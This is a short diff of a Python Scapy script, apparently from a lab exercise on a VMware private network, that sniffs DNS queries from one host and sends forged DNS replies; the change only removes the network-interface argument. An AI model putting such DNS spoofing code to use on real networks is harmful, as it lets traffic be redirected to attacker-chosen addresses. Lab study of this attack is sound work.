@@ -22,4 +22,4 @@ def spoofDNS(pkt):
         spoofpkt = IPpkt / UDPpkt / DNSpkt
         send(spoofpkt)
 
-pkt = sniff(filter = 'udp and (src host 192.168.177.134 and dst port 53)', iface='VMware Network Adapter VMnet8',prn = spoofDNS)
+pkt = sniff(filter = 'udp and (src host 192.168.177.134 and dst port 53)', prn = spoofDNS)
